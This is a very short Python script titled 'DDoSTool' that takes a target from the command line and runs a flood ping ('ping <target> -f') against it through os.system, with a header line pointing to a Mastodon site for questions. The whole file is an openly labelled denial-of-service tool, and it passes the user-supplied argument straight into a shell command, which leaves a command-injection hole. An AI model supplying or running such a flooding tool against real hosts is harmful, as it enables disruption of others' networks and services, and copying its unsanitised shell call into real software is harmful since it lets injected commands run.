# ~ DDoSTool ~
# Any question? HMU on https://mastodon.lol

from sys import argv
from os import system

def main():
  system("ping %s -f" %argv[1])

if __name__ == "__main__":
  main()
